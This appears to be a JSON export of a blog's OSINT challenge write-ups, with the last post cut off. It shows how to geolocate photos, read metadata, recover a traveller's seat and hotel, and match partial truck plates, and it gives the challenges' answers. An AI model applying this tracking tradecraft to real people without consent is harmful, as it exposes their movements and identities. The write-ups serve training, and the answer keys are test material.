
[{"content":"","date":"31 March 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"31 March 2025","externalUrl":null,"permalink":"/categories/osint/","section":"Categories","summary":"","title":"OSINT","type":"categories"},{"content":"\rExercise 31 #\rFor this challenge we are required to find the giraffe and the status of the giraffe at the new location. Below is the task briefing\nThe newborn giraffe seen in the photo below belongs to an endangered species. Individuals such as this one, born in captivity, often participate in conservation programs. This may include transfers to accredited facilities for carefully planned breeding efforts aimed at ensuring the survival of their species. Your task is to find the following information regarding the individual seen below: a) Location and date of birth. b) Current residence and date of arrival. c) A photo in its current habitat. Below is the image of the giraffe.\nLocation and date of birth. #\rWe shall start by first performing an image reverse search.\nAs seen above we have been able to find a source that contains an image that is a replica of our challenge image, we can click on the link of the image and find where the giraffe is located.\nWe have been able to identify more photos of the same baby giraffe as shown below.\nand our challenge photo was from the blog itself as shown below.\nFrom the blog, the baby giraffe is a girl, furthermore, from the blog we have two conflicting dates when the giraffe was born from the top the date is said to be October 23rd and as we go on to read more about the giraffe we find that the giraffe was again born on October 21 at 9:15 p.m so which date is true?\nFrom the blog, the giraffe was born at Virginia zoo and we are provided with a link to the zoo’s website, we can try and search the website on web archive and see if we can fin a post about the giraffe’s birth as endangered species’ birth are usually a big deal and they require protection from poachers.\nAs seen above, going to the snapshot of November 2 2009 we get the post of a masai giraffe that was born on October 22, 2009. Clicking on the link, we find that the page was archived on October 31 and below is the blog\nWe have a date that has two sources October 21, 2009 at 9:15pm on the archived post, the date was on a Wednesday and after clarifying the date it was truly on a Wednesday.\nFrom the archived blog, we have a link that shows more images of the same baby giraffe.\nand as seen above again, we have the same date again of October 21 2009 therefore, with that information we can now say our baby Giraffe was born on October 21, 2009\nAnswer: Virginia Zoo date: October 21, 2009\nCurrent residence and date of arrival #\rWe now know the names of the parents to the baby Giraffe father 8-year-old male, Billy and mother 7-year-old female, Imara and it belong to the masai Species. We can now search for the parents on the website we initially found after doing reverse image search and see what details we shall find about the parents of the daughter.\nFrom the new blog entry, we have some interesting information as shown below.\nWe have the name of our baby Giraffe birthed by Imara who is at Disney's Animal Kingdom in Florida. We shall search for this location and see if the giraffe is the same baby who was Virginia Zoo.\nThe source we found above, gave more information about the birthed Giraffe as shown below.\nFrom the description on the blog above it matches our baby Giraffe, now we know our Giraffe is called Willow and was moved to Disney's Animal Kingdom in Florida on October 12 but we do not know which year the baby arrived at the Kingdom we shall search and find out on google.\nFrom the source above, searching fro October 12, I got 2010 this is because from the post Wilow is 1-year-old and she was born on October 21 2009.\nTo verify I searched what day of the week it was on October 12, 2010 as seen below and it was truly a Tuesday.\nAnswer: Disney's Animal Kingdom in Florida arrival date: October 12, 2010\nA photo in its current habitat #\rThe search we did earlier of our baby Giraffe, we got many results and scrolling through the results I got a link claiming to be of our baby Giraffe as shown below.\nThis source was a false source as the image we have is not of a masai giraffe neither of a reticulated giraffe.\nBelow is the image from the found source.\nAs seen this giraffe is neither a reticulated nor a Masai Giraffe. We can redefine our search and try again as shown below.\nFrom the source identified we have found our girafffe but we shall verify if it is truly the one .\nand we have clearly identified Willow as shown above below is the actual image.\n","date":"31 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-31/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 31)","type":"posts"},{"content":"","date":"31 March 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"31 March 2025","externalUrl":null,"permalink":"/","section":"v1c70r_n00b'$ Blog ⚔︎⛊","summary":"","title":"v1c70r_n00b'$ Blog ⚔︎⛊","type":"page"},{"content":"\rExercise 29 #\rThis challenge was quite a tough one as we are required to know which book the person was reading yet the image from the challenge is too blurry. Below is the task briefing.\nI took the photo below whilst riding a train in the UK. I always prefer quiet areas where no one can sit behind me because, in a public space, no information is truly private. Your task is to: a) Uncover what the person in front of me was reading. b) Identify the train model. c) Identify my seat number. Here is the image we are to use for our investigation.\nUncover what the person in front of me was reading. #\rFor this section, we shall try and identify few words from the text if they are visible enough for us to read. From the image, it is clearly seen to be a reflection , I will try and turn the image to identify words.\nAs seen above we have been able to flip the image horizontally, we can try and read the words using the old book technique of squinting(can use this technique if you do not have eye problems).\nAs seen above we are able to identify few words She has the letters from William's cousin james we can search for a book with this words. After some searches online, I came across google’s advance book search that you can use to search a book with specific words, let us try it out and see what we shall find. This route gave me a lot of books to identify, however, since this challenge was solved some time back with other participants, I tried to search for the words on google using this google dork query \u0026quot;She has the letters from William's cousin james\u0026quot; book and got the book as shown below.\nand to verify if truly it was the book, I searched for the words we identified and got the words clearly.\nAnswer: Sara Sheridan’s book, The Fair Botanists.\nIdentify the train model #\rFor this section we shall first start by analyzing the image as shown below.\nWith this features identified, we can now try and search online for trains in UK with red and grey themed seats with QR code label sticker at the back.\nUsing the description, I was able to get a link to LNER trains FAQ page, thanks to the sites SEO mechanisms implemented. Looking around the website, I was able to identify a few features we saw in our image analysis.\nThis is an advert form the our trains page. From this page, I explored different classes standard,first class and our Azuma but for our Azuma I got a seat map rather than how the seats look like, therefore I decided to search for the LNER train azuma seats.\nWe have found our train. From the description it is one of the standard class coaches of an 800 series Azuma train\nAnswer: LNER Azuma train\nIdentify the seat number #\rFor this section, I had to reason some things, first Sofia being an OSINT analyst would like seat at the back as she is cautious of her privacy, two she would go for a quieter place as most investigative cyber security practitioners prefer a place with less noise for rest and peace of mind and from the image the person was seating in front of Sofia, therefore, she is seated somewhere at the back near a window.With this information we can use the seat map for azuma we found earlier\nAs seen above, after searching for quieter, we get coach H. We can go to this coach and find which seats are at the back.\nWe have found the map for coach H, now with the previous views Back seat near a window we have two seats 88 and 83. Let us go back to our challenge image and look at it again closely after we rotated it horizontaly.\nFrom this image, we can conclude the person was reading the ebook seated at seat 79p therefore Sofia was at seat 83. The reason behind this is if the person was seated at seat 86 and Sofia took her a photo, the reflection would be different because, the image would show her left arm too and the ebook would be at a distant from the window.\nAnswer: 83\n","date":"30 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-29/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 29)","type":"posts"},{"content":"\rExercise 27 #\rFor this challenge, we are required to find the following details outlined in the task briefing below.\nThe image below shows a group of people sitting in front of a large screen that reads “Lectura en Movimiento en Lima”. A speaker can be seen standing on the left-hand side in front of three large flags. Your task is to: a) Name the speaker. b) Identify what he was wearing on his lapel. c) Find footage of his speech. Below is the image we are required to investigate.\nFrom the above image we can see some clear details we can use. First the event name lectura en movimiento en lima . This information is not sufficient enough we can start by doing some reverse image search.\nName the speaker. #\rWe shall start first by performing a reverse image search to identify this event.\nwe have found some interesting sources, clicking on this link from one of our identified sources, I got the blog shown below with some images and details about the members who were in the event whom we can identify and features that are similar.\nReading through the blog, we get our person Juan Carlos Ruiz but we shall verify if truly he is aour speaker.\nAs seen above, we have been able to put some details that makes the person identified be the true person as from the image form the blog it is just a clearer zoomed version of the challenge image.\nWe found his full name on Linkedin as shown below.\nAnswer: Juan Carlos Ruiz Rodriguez\nwhat he was wearing on his lapel #\rFor this section, we shall search for our person and try to identify what he was wearing on his lapel.\nThis is the image from the blog page we found earlier showing our person of interest more clearer.\nAfter searching our person online, we are able to identify him more closer showing the item on his lapel as shown below from this link\nAnswer: OEI logo\nFind footage of his speech #\rI searched for the videos of the event and found a youtube link with the speech of the director starting at 9:30 and ending at 18:14\n","date":"29 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-27/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 27)","type":"posts"},{"content":"\rExercise 28 #\rFor this challenge we are provided with an image that we are required to find the details of the image as briefed below.\nSometimes the fastest way to geolocate an image is to track down the movements of the person behind the lens. I took the photo below, on 20 September 2023, at 08:11 local time. Your task is to determine: a) What device I used to take the photograph. b) Where I was headed. c) How far I was from the entrance of my destination. there is also a bonus challenge Bonus challenge: In which hotel did I stay?\nAbove is the full image from the challenge.\nWhat device I used to take the photograph #\rFor this question we can check the image file metadata, metadata simply refers to a set of data that describes and gives information about other data.\nWe can use this tool to check the metadata of the image file or if you are using a UNIX based machine like kali linux, you can use a tool called exiftool the syntax to run the command is exiftool \u0026lt;filename\u0026gt; below is the details of the device used as seen in the metadata extractor.\nsearching the code of the machine online we get the following details\nThe code identifies the device as Samsung Galaxy A12\nAnswer: Samsung SM-A125F camera model or Samsung Galaxy A12\nWhere I was headed #\rFor this, we can start first by identifying where the person was on the time she was taking the photo. From the metadata, coordinates of the location of the image are usually embedded on the image, we can check if we have any longitude and latitude coordinates on the image metadata. There are no coordinates.\nWait from the task briefing, the image was taken on 20 September 2023, we can filter for this date for any of her post on either of her social platforms to see where she was heading. We shall start with twitter by using some search dork queries for the specific date.\nbingo we found a tweet that could be of interest, I played around with tweaking the dates form 20th to 3oth of September 2023 and came across this tweet, from the tweet, Sofia was part of the celebration of women in OSINT, going through the tweet pictures, I got this letter of appreciation dated 20th September 2023 on which Sofia was recognized for her contribution to the SIRUS CTF finale.\ntherefore Sofia was headed to the Europol’s event of women in OSINT. As seen from the post above, this is a good recognition to Sofia Santos, we could search this pot on her LinkedIn and see if we shall find more details of where she was headed for the event.\nwe have found the post, we can now go and check it out.\nWe have found more details, we can now search the Europol headquarters in Netherlands.\nWe have been able to find the headquarters’ location Eisenhowerlaan 73, 2517 KK The Hague, Netherlands\nAnswer: Eisenhowerlaan 73, 2517 KK The Hague, Netherlands\nHow far I was from the entrance of my destination #\rFor this question lets first try and find the location on which the image was taken from as it could be near the venue but first I was able to identify some useful information on the image as seen below when zoomed closer.\nThe number 55. We can try and search for something like Eisenhowerlaan 55 on google maps and see if the place matches our image.\nAs seen above, we have been able to locate the building on Eisenhowerlaan 55 we can now try and calculate the distance from this point to Eisenhowerlaan 73 where the Europol headquarters is.\nAs seen above we have been able to locate the two places how far they were from each other and got the distance as approximately 198 metres\nAnswer: 198 metres\nWhich hotel did I stay? #\rFrom the LinkedIn post, we can see an image of Sofia Santos holding a medal but the background is a bit blurred our, however, we can be able to see some features we can use to identify the hotel in which Sofia stayed.\nAs seen from the image above it is blurry but we are able to identify some features we can use to pinpoint the location on google earth pro.\nI toured around Netherlands from the location of Europol headquarters and found a location with similar building structure which we highlighted with black as seen above.\nZooming in closer, we got the following houses from the image.\nAt this location, we can look around for hotels that have a similar balcony as that on the image.\nAfter playing around with google street view, I was able to locate a hotel with similar balcony structure as that in the image and the hotel location is as shown below.\nWith that we have been able to find our hotel as shown below.\nthe name of the hotel is Ibis Styles Den Haag Scheveningen\nAnswer: Ibis Styles Den Haag Scheveningen ","date":"29 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-28/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 28)","type":"posts"},{"content":"\rExercise 26 #\rFor this challenge we are provided with a zip folder containing some images and a video, we are required to find the train station the person boarded and alighted from.\nThe image below shows the contents of a zip file. Inside you will find a 31-second video recorded during a train ride, and four photos of undisclosed locations. They were all taken by the same individual in February 2024. Despite having no useful metadata, they still contain enough information to track down this person’s movements. Your task is to determine: a) At which train stations did the person board and alight? Here is the link to the zip file\nFurthermore, the challenge has some bonus questions we can try to answer as shown below.\nBonus challenges: Identify the mode of transportation in each image. Determine the type of train they rode. Estimate the speed at which the train was travelling when the footage was recorded. Calculate approximately how far did the person travel overall. Photo 1 #\rWe shall start with the photo below for our analysis\nFor this photo we can try by doing an image reverse search to find where this location is from.\nAs seen above, we have been able to locate the location Chorsu Bazaar Uzbekistan we can look at this location on google maps and try identify where this photo was taken from using street view and comparing the image alongside the view.\nThis approach was quite challenging, we shall first start by analyzing our photo to see what we can identify.\nAs seen above we have been able to identify some features from the image and furthermore, the person was at a higher ground as the people seen on the image are at a lower place.\nWe can try and crop the image to find the building we have identified on the image and see where it is located.\nWe have found our building it is called Tts \u0026quot;Chorsu\u0026quot; as seen below on the google maps\nWith that we have been able to see where the photo was taken from Chorsu Bazaar Uzbekistan but we need to verify the location where our person took the photo, we can try and search on earth pro.\nWe are unable to find any street views in particular to our image but I was able to identify a probable location where our person was by the time of taking the image.\nFrom the image analysis, the person was traveling on foot as this is a busy market place and from where he.she was taking the photo, it seems the person was seated and many shops were not open, it was therefore morning hours, the person could be enjoying a cup of tea or coffee from the shop he or she was. The name of the city was Tashkent.\nAnswer: 41°19'34.6\u0026quot;N 69°14'05.8\u0026quot;E, mode of transport: By foot\nPhoto 2 #\rFor this section, we shall be looking at this photo.\nWe can start by an image reverse search just like the previous image.\nAs seen above, we have been able to find the location Navruz park, Tashkent Uzbekistan\nAs seen above we have located our location, moreover from the image, it was in the morning as there are no shops that area open at the moment. The mode of transport used was on foot.\nAnswer: 41°19'34.2\u0026quot;N 69°15'57.8\u0026quot;E ,mode of transport: By foot\nPhoto 3 #\rOur third photo to analyze is as shown below.\nLet us try and do it differently, we shall start by analyzing the photo for features we can use to identify the location as shown below.\nWe have been able to identify two features, we can try a reverse image search and see if we shall find a location with these features. Reverse image search was not sufficient, we shall zoom closer to the image and try find more details.\nAs seen above, there is a car rental shop near by, since the last two photos we saw, were all in Uzbekistan, we can try and search for car rental shops in Tashkent and see which one has the same match as ours.\nAfter some searched, I was able to find a shop that matches the advert color on the poster of the shop.\nWe are now close to the location of our image.\nAs seen above, we are now able to locate where our image was taken from.\nFrom the image the person was on a vehicle, and as the person seems to be traveling a lot, the person is a tourist therefore for this case means of transport could be a taxi.\nAnswer: 41°17'57.6\u0026quot;N 69°16'21.1\u0026quot;E, mode of transport: Taxi\nVideo #\rFor this video, we need to think about the context: the images we are analysing seem to be from someone’s camera roll. They are named like a digital camera would name images: incrementally. Thus this video, IMG_2677, has been taken after the three images we already localised: IMG_2597 (Chorsu Bazaar), IMG_2626 (Halva Café) and IMG_2658 (Subway entrance). It would stand to reason that the train this person took departed from Tashkent.\nIf we take a look at a map of the railways in Uzbekistan, there are 4 railways leaving Tashkent:\nLooking at the video, we are able to identify some details shown in the image below.\nThere are mountains in the background with some pattern.\nThe sun on the image is to the left, that is behind the train, we can check the sun position using suncalc as shown below.\nPosition of the sun on February 15th 2024 at 12:01\nThis suggests that the train was most likely heading southwest, following the fourth railway on our map. The next major stop along this route is Samarkand. When examining this region on Google Earth, only the final third of the journey (highlighted in red below) appears to feature the mountainous terrain visible in the video.\nAt last now we have a smaller location to search, from here, I looked for the unique patterns we saw on the mountains and found them as shown below.\nMoving along the site, I was able to identify a location that has a fuel station and a junction where cars cross the train tracks and found the following location.\nFrom the image above we have been able to identify our location.\nAnswer: 40°05'50.9\u0026quot;N 67°48'11.7\u0026quot;E\nPhoto 4 #\rThis photo too we shall first try and analyze it and see features we can use to locate our place, then perform a reverse image search.\nAfter identifying the features, we shall use this details to confirm our location. As from the video, we have found the person was probably heading to Samarkand , we can look around this region to see if we can identify any overpasses with these features.\nSearching through the region, we are able to get our location a shown below.\nAnswer: 39°39'54.0\u0026quot;N 66°58'47.2\u0026quot;E mode of transport: Taxi\nTrain stations and speed traveled #\rFrom our analysis from Tashkent, I was able to locate train stations near by. As from the location of where the person was from the market to the picture taken while on a taxi near a bus stop, we can conclude the train station he/she boarded the train from is Stantsiya Tashkent Pass Tsentr as shown below.\nStation where the person boarded the train Stantsiya Tashkent Pass Tsentr\nThe location he alighted the train station is Samarkand station.Since now we now the train station the person boarded and alighted from, we can search for the type of trains found in Stantsiya Tashkent Pass Tsentr, where the person boarded the train.\nTo decide which train was used, I checked the train timetable here as shown below.\nthe train used is therefore Afrosiyob Train as it is fast and from the timetable the trips are usually made on a daily basis.\nSpeed the train traveled during recording. #\rAs seen above, the distance of the train during the time of recording is 0.19 miles and the duration was 8 Seconds ,therefore after calculation, the speed is 85.5 mph as shown below.\nAnswer: 85.5 mph\nTotal distance covered #\rAs shown below the distance calculated roughly from the market to the Tashkent train station is 7.4 km\nA quick Google search for the train distance between Tashkent and Samarkand yields about five vastly different figures. I opted for what seemed to be the most reliable source, which estimated it at approximately 300 km.\nFinally, the distance from the Samarkand Train Station to the Siyob Hostel—which I assume is the person\u0026rsquo;s accommodation, given its closeness to the approximate viewpoint of the last photo—is:\n5.3km\nTherefore total is approximately distance covered is 312.7 km\n","date":"28 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-26/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 26)","type":"posts"},{"content":"\rExercise 25 #\rFor this challenge, we are required to locate the building with the art on the image and find another quote on the same building with a quote containing the word anarchy as indicated in the task briefing.\nThe world is full of anonymous quotes. Several were written in the unidentified building seen below. Your task is to: a) Locate the building. b) Find the quote containing the word “anarchy”. Below is the image of the quote on the wall.\nLocate the building #\rFor this area we shall start by performing a simple reverse image search to find some details about the art. From the reverse search we get a couple of results as shown below.\nLooking at the reddit source, it says it is in France, however, to verify if it is true, we shall now use the quote itself to search for the location as the quote seems to be behind a bigger mantra.\nUsing the quote itself I came across this blog with an image that looks similar to the challenge photo as shown below.\nEven though, the image on the blog is more older than the one on the challenge photo they look similar in many aspects. Moreover, from the blog we have been given a location Sykes Datatronics Rochester, NY we can search for this building and see if we can find more details about it and the art too.\nAs seen above, after searching for the building I visited the first link but got no results of our image but the second one gave me more than I wanted, I also got a photo that was in the same building with the word anarchy hence solving our second question too.\nWhen I zoom closer to the image with the quote is as seen below.\nNow to find the location of the building, we shall go to google maps and search for the building.\nWhen searching for the building on google maps, it redirects to abandoned subway rather than Sykes Datatronics as seen below.\nSince from the blog we identified earlier says the building was unoccupied and was damaged with a number of fires over the year, we could search when it was abolished and use google earth pro to locate it.\nFrom google AI, we now know it was demolished by 2014 furthermore, we have more details from this link where we are told, the building sits empty at Orchard street and we are provided with a link to google maps street view, here is the link.\nAnswer: 384 Orchard Street\nFind the quote containing the word “anarchy” #\rScrolling through the album we get our image with a quote that contains the word Anarchy as shown below.\nAnswer: This office was a prison for our brothers and sisters in wage salvery. Let's make it a carnival for our brothers and sisters in anarchy\n","date":"27 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-25/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 25)","type":"posts"},{"content":"\rExercise 24 #\rFor this challenge, we are required to find where the members in the photos pay their allegiance to as indicated in the task briefing below.\nThere are countless armed insurgent groups spread throughout the globe. The three images below depict individuals associated with internationally recognised terrorist organisations. Your task is to identify to which group they have pledged their allegiance. a) Photo 1 b) Photo 2 c) Photo 3 The links to the photos are as follows, photo 1, photo 2, photo 3 and below are the photos too as well.\nPhoto 1 #\rFor this photo below, we shall start by performing a reverse image search.\nAfter performing a reverse image search, we get the following date as shown below.\nI clicked on the youtube link and got clear image of how the members look and the uniform attribute.\nThe group is based in Colombia and is referred to as Ejército de Liberación Nacional(ELN) as of Wikipedia source and below is the logo of the army.\nAnswer: ELN(Ejército de Liberación Nacional)\nPhoto 2 #\rFor this image I started by performing a reverse image search on all search engines but the one that provided me with details replica to the image was from yandex as shown below.\nClicking on the link, I got some details I could use to search for more details about the image as shown below.\nWe can now search for Kurdistan female terrorist groups and see what we can find.\nAs seen above there is a party that is popping up a lot PKK. Searching more details about it, I found that the party is referred to as *Partiya Karkerên Kurdistanê* or the Kurdistan Workers’ Party.\nLooking at the uniform of the PKK female fighters and the one we have on the challenge image, they do not look similar at all as shown below.\nFollowing through the blog on wikipedia I came across, the Syrian Democratic Forces, having the knowledge Syria has been prone to terrorist attacks, I clicked on the link to get more details about it.\nFrom the screenshot above, showing how SDF was established the YPG and YPJ are the same people, although YPG(Yekîneyên Parastina Gel) or People’s Protection Unit is male based and YPJ(Yekîneyên Parastina Jin) or Women’s protection unit is female based. Below is the flag of the different groups.\nThey both have the same star but with different surroundings, we are getting close, next, I searched for the uniform of YPJ members to see how it looks like, below is the image of the uniform.\nIt is different form the one on the challenge as it is not too bright like for YPJ. I decided to go back to our first finding of PKK where there is another female unit referred to as YJA-STAR, The female military wing whose flag looks as shown below.\nThis was quite a ride, searching online for the uniform of the unit, I got the following\nThe have the same uniform, therefore, we can now attribute that the female in our challenge photo is of the YJA-STAR group.\nAnswer: YJA-STAR\nPhoto 3 #\rFor this image I first began by analyzing the contents of the image as shown below.\nAfter analyzing the image, I then searched for terrorist group with the flag description.\nAs seen above, we have found a unique flag matching our description, the group is referred to Jaish al-Adl, we can search the group and see how their uniform looks like.\nIt is now clear, we have our militia group identified as Jaish al-Adl\nAnswer: Jaish al-Adl\n","date":"26 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-24/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 24)","type":"posts"},{"content":"\rExercise 23 #\rFor this challenge, we are required to find the details of the photo used as wallpaper as indicated in the task briefing below.\nSometimes online footage contains more information than meets the eye. In October 2023, I uploaded a video to my YouTube channel where, for a split second between minute 3 and 4, my desktop wallpaper is partially visible. **Your task is to:** a) Find the title of the illustration, as given by the artist. b) Find how much it would cost for the artist to create a similar piece, in size and detail. Here is the link to the youtube page. From the task briefing, we are told the video was uploaded on October 2023 and for a split second between minutes 3 and 4, the desktop photo was partially visible. With this information, it was quite clear we are required to play with the , and . on the youtube video as this symbols help in moving the video ahead or behind by a frame, that is the ,moves the video behind a frame and .moves the video ahead by a frame.\nWatching the video from minute 3 to 4 while adjusting the frames, I was able to identify the wallpaper as shown below.\nAt 3 minutes and 38 seconds,we are able to identify the partial wallpaper image after adjusting the frames with .to move the video ahead.\nFind the title of the illustration, as given by the artist #\rBelow is the image we are required to find the title of the illustration.\nWe can do a reverse image search of the image and see what results, we shall get.\nAs seen above, we have been able to identify the exact image, we can follow the link and see what is the title of the image.\nWe have been able to identify the illustration but we have to verify if that is truly the title of the illustration, as we have the name Adam-Scythe,we can search for the name and see if we can find our image.\nAs shown above, this was the result after searching for the artist at DeviantArt with the name Involuntary Rat Queen and we have been able to verify that trully Adam-Scythe is the artist behind the art and the name of the illustration Involuntary Rat Queen.\nAnswer: iNvoluntary Rat Queen\nFind how much it would cost for the artist to create a similar piece, in size and detail #\rFor this section, I decided to search for prices of the arts by Adam-Scythe on DeviantArt profile of his and got the following details and the price for the image that is similar to the one we found.\nAs seen above, we have been able to find the details of the prices for images in the same class as ours.\nAnswer:$190\n","date":"25 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-23/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 23)","type":"posts"},{"content":"\rExercise 22 #\rFor this challenge, we are required to find a partial number plate of the trucks and where the camera is located as indicated in the task briefing below.\nThe two images below come from a security camera overseeing a port. They were taken almost nine years apart. Both have a vehicle highlighted. Your task is to: a) Find the link to the camera’s live feed. b) Geolocate the security camera. c) Find the license plate of the vehicle highlighted in blue. d) Find the licence plate of the vehicle highlighted in orange. Note:For the sake of privacy you only need to provide the bottom half of the licence plate containing 2 sets of numeric values, as such: [XX]-[XX]. Below are the images we are required to use for or analysis. Find the link to the camera’s live feed #\rFrom the first photo we can identify some details as shown below.\nThe camera live feed is from Yamoto fishing port and it was on March 11, 2015.Although we have been able to identify the port at which the live feed was from, the information is not enough for us to use to get the link of the camera live feed. We can perform a reverse image search and see if we can get more information. After a couple of searches and looking at the note on the challenge * Note: Although it is still possible to find the link, unfortunately, the live feed has been down since January 2025, I was unable to find the live feed but from past participants of this challenge the link that was found to contain the live feed was this link.\nAnswer: http://202.239.224.34/cgi-bin/guestimage.html\nGeolocate the security camera. #\rFor this section, we need to search for the port on google maps and try to identify the street view in order to find the view that looks similar to that in the captured video.\nAs seen above, after analyzing the image and the street view, we are able to identify where the camera is. With further analysis, we area able to identify the location of the camera by zooming in on the street view as shown below.\nThe location of the camera is 38°24'34.1\u0026quot;N 141°14'40.6\u0026quot;E.\nAnswer: 38°24'34.1\u0026quot;N 141°14'40.6\u0026quot;E\nFind the license plate of the vehicle highlighted in blue #\rWe are required to identify the number plate of the truck in this image below.\nFrom the street view, we are unable to identify the vehicle in blue rather the truck in orange, however, form the structure of the truck it seems they are both from the same company, looking at the street view in google maps, I was able to identify the name of the company Aizawa suisan Japan and searched through their website where I was able to identify a truck that is a replica of the one in blue as shown below.\nThe number plate of the truck is 56-36\nAnswer:56-36\nFind the license plate of the vehicle highlighted in orange. #\rThe image of the vehicle we are required to identify on the image is as shown below.\nThis vehicle was easy to identify on google maps as shown below.\nFrom the body of the truck, we can identify the details of the company as Aizawa suisan Japan.\nWe can search for this company and see if we can be able to identify the number plate of the vehicle if they have it on their website. However, we are unable to find the exact image of the truck. I searched for the ;ink to any of their social media pages and found for facebook from this page as shown below.\nthe number plate is 31-20\nAnswer: 31-20\n","date":"24 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-22/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 22)","type":"posts"},{"content":"\rExercise 20 #\rFor this challenge we are required to find the contents of the challenge itself as it is not in the link of the challenge as shown below.\nHowever, as we scroll down the page we get a hyperlink on the three dots as shown below but we are redirected to an image that gives us no clue. ![[Pasted image 20250321120831.png]] This is the image we get when we click on the link embedded on the dots.\nAfter Some time of thinking, I decided to check the challenge on the wayback machine on this link and we get our challenge content. From the wayback machine, I was bale to find a bunch of snapshots of the webpage but the snapshot of August 28, 2023 provided me with the page with the contents of the challenge as shown below. With that we have been able to find our challenge and the task briefing as stated below.\nThe internet is a digital ecosystem in constant transformation. Websites change appearance, domains change owners, businesses open and close, and accounts are created and deleted. In July 2023, x.com went from being an almost blank page to redirecting to twitter.com. Your task is to go back in time, until the year 2000, and find the following information within the x.com website: b) The Frequently Asked Questions page. c) The list of members of the management team in July. The frequently asked question page #\rWe shall still use the wayback machine to find the website x.com and search for the FAQ page. From the task briefing, we are required to go to the year 2000. As we look at the site map section, we have different elements as shown below.\nWe can try look at the pages as they are arranged in alphabetical order to see if we shall find the page. This was a tiresome path, I therefore went to the URLs section and searched for the faq page but got nothing of use. Checking the calendar and clicking at different snapshots, I got a faq page which looked as shown below.\nThe page, secure.x.com/help_faq.asp is not there it has an error of 404, I tried searching for the word help as a page on x.com without the subdomain secure as shown below and I was able to find a faq page for the year 2000.\nClicking on the link, we are redirected to a page containing more details as shown below.\nClicking on the snapshot of March 4, 2000, we are redirected to the page shown below.\nThe list of members of the management team in July #\rFor this section I searched under the URLs section for management but I was unable to find a page on the year 2000, but after modifying my search to search for about as shown below, I was able to find our page.\nClicking on the link, we are redirected to the details of when the page was archived as shown below.\nbut after clicking on the March 2, 2000 snapshot we are redirected to our page as shown below.\nWith the above findings, we can confidently say we have finished solving the challenges.\n","date":"21 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-20/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 20)","type":"posts"},{"content":"\rExercise 21 #\rFor this challengewe are required to find the location on the chocolate as stated in the task briefing below.\nMaps can appear in the most unusual places. The figure below contains a chocolate bar featuring a map. Next to it you will find the satellite view of the same location. Your task is to: a) Find the coordinates of the location seen in both images. The coordinates of the location #\rFor this section I begun by searching the words on the logo in the chocolate which were DO IT RIGHT as seen on the image of the chocolate. The chocolate is called Puchero, we can now go to their page and see more details about it. There are more chocolates form the company, however, when we navigate to the GET IN TOUCH page, we are met with a map that we can analyze further. From the map, it is almost resembling the map on the chocolate, we shall copy the location and open it on google earth pro and look at it closer with the chocolate image on the side and compare if they truly are the same. From the analysis above we have identified the location on the chocolate was the actual map of where the chocolate company is located.\nAnswer: 41°21'10.3\u0026quot;N 4°41'24.4\u0026quot;W\n","date":"21 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-21/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 21)","type":"posts"},{"content":"\rExercise 19 #\rFor this challengewe are provided with a transcript containing communications between two people over phone, however, we can only be able to see one side of the communication. Below is the task briefing.\nThe text below is a partial transcript of a phone call in which you can only read one side of the conversation. Despite the text being completely fabricated for this exercise, the location described is real. Your task is to geolocate where the person was at the time of this fictitious phone call. Below is the transcript that we are required to analyze to find the location of the caller at the time of the call. From the above transcript, I was able to identify some interesting information that could aid in identifying the location as shown below.\nFrom the above image, we are able to identify some crucial information, the person is in a city which half an hour away to the cousin\u0026rsquo;s place near a sea, hence the country is not land-locked. The country the person is in speaks German as one of its languages hence Germany is out of the picture as German is a national language, the place he visited is a prayer area and from the conversion it seems the place is near a water body that connects with the sea as the person says The same water .Furthermore, the city the person is in has buses and train stations nearby.\nThis found information is sufficient enough for us to search online and find the country. As seen above from the identified countries, after going through the countries, Belgium stood out for me as it is near a water body unlike the others apart from Germany but Germany was also ruled out as it speaks German as a national language, however, from Belgium I was able to identify three cities as shown below. Ghent,Bruges and antwerp\nFrom this three cities, I checked the three cities with water bodies that are connecting to the large water body and found two to be of interest to me as shown below. Now on to measuring the distance form the cities to the water bodies, Ghent was close to the described distance in the transcript as shown below. Now diving to the city and search for prayer centers like mosques I found a number of them in the city as shown below. One mosque caught my eye, from the transcript the person seemed to be making a joke about carrying their swimming costume and this mosque Moskee OKBA IBN NAFI had a blue carpet resembling a water body as shown below Looking at the mosque Facebook page, it validated our findings as the mosque seemed to be undergoing some renovation as shown below. Now looking around the area within the mosque on google maps, I was able to identify train tracks and bus stops. With that information, we can clarify that the location of our caller at the time was at Moskee OKBA IBN NAFI\nAnswer:Moskee OKBA IBN NAFI\n","date":"20 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-19/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 19)","type":"posts"},{"content":"\rExercise 18 #\rFor this challenge we are required to find the details described in the task briefing as shown below.\nIn May 2023, the world witnessed the coronation of King Charles III at Westminster Abbey in London. Following the ceremony, and similarly to the previous regent, the monarch travelled through the city in a lavish carriage. The route of the 2023 royal procession differed from that of 1953. Your task is to: a) Identify from which exact door Queen Elizabeth II left Westminster Abbey after her coronation. b) Measure the distance travelled by the Queen’s carriage, following the 1953 